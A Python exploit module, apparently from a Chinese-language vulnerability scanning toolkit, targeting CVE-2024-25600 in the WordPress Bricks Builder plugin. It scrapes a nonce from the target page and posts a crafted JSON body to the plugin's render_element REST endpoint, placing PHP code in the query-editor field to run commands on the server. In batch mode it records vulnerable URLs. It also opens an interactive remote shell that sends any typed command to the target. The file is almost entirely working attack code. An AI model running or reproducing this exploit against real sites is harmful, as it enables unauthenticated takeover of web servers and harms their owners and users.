#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests,urllib3,re
import warnings
from rich.console import Console
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning, module="bs4")
urllib3.disable_warnings()
class Cve_2024_25600:
    def __init__(self):
        self.__nonce = None
    def fetch_nonce(self,url):
        try:
            response = requests.get(url, verify=False, timeout=20)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, "html.parser")
            script_tag = soup.find("script", id="bricks-scripts-js-extra")
            if script_tag:
                match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string)
                if match:
                    return match.group(1)



        except Exception:
            if not self.batch:
                OutPrintInfo("WordPress", "未能获取到nonce值")
    def process_response(self, response):
        if response and response.status_code == 200:
            html_content = response.json().get("data", {}).get("html", None)
            if html_content:
                match = re.search(r"Exception: (.*)$", html_content, re.DOTALL)
                if match:
                    exception_text = match.group(1).rstrip()
                    parts = exception_text.rsplit("\n", 1)
                    if len(parts) > 1:
                        extracted_text = parts[0]
                    else:
                        extracted_text = (
                            "but the payload is not enough to RCE, bypass is valid"
                        )
                    return extracted_text, html_content
    def interactive_shell(self,url):
        session = PromptSession(history=InMemoryHistory())
        self.console = Console()
        while True:
            try:
                cmd = session.prompt(HTML("<ansired><b># </b></ansired>"))

                if cmd == "exit":
                    break
                if cmd == "clear":
                    self.console.clear()

                response = self.send_request(url,command=cmd)
                response_result, _ = self.process_response(response)
                if (
                    response_result is not None
                    and not "not enough" in response_result
                ):
                    OutPrintInfoSuc("WordPress",f"回显:\n{response_result}")
                else:
                    OutPrintInfo("WordPress", "No valid response received.")


            except KeyboardInterrupt:
                break
    def send_request(self, url,postId="1", command="whoami"):
        headers = {"User-Agent":self.headers["User-Agent"],"Content-Type": "application/json"}
        json_data = {
            "postId": postId,
            "nonce": self.__nonce,
            "element": {
                "name": "carousel",
                "settings": {
                    "type": "posts",
                    "query": {
                        "useQueryEditor": True,
                        "queryEditor": f"throw new Exception(`{command}`);",
                        "objectType": "post",
                    },
                },
            },
        }
        req = requests.post(
            f"{url}/wp-json/bricks/v1/render_element",
            headers=headers,
            json=json_data,
            verify=self.ssl,
            proxies=self.proxy,
            timeout=20,
        )
        return req
    def run(self,url):
        self.__nonce = self.fetch_nonce(url)
        if not self.__nonce:
            return False
        try:
            req = self.send_request(url)
            extracted_text, html_content = self.process_response(req)
            if extracted_text:
                if not self.batch:
                    OutPrintInfoSuc("WordPress", "目标存在WordPress Bricks Builder插件漏洞")
                    OutPrintInfo("WordPress", url)
                    OutPrintInfo("WordPress", f"响应:\n{extracted_text}")
                    return True

                else:
                    OutPrintInfoSuc("WordPress", f"目标存在漏洞: {url}")
                    OutPutFile("wordpress_2024_25600.txt", f"目标存在WordPress Bricks Builder插件漏洞: {url}")

            else:
                if not self.batch:
                    OutPrintInfo("WordPress", "目标不存在WordPress Bricks Builder插件漏洞")


        except Exception:
            if not self.batch:
                OutPrintInfo("WordPress", "目标不存在WordPress Bricks Builder插件漏洞")
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("WordPress", '开始检测WordPress Bricks Builder插件漏洞...')
        if self.run(url):
            if not self.batch:
                OutPrintInfo("WordPress", '开始进行SHELL利用...')
                self.interactive_shell(url)
        if not self.batch:
            OutPrintInfo("WordPress", 'WordPress Bricks Builder插件漏洞检测结束')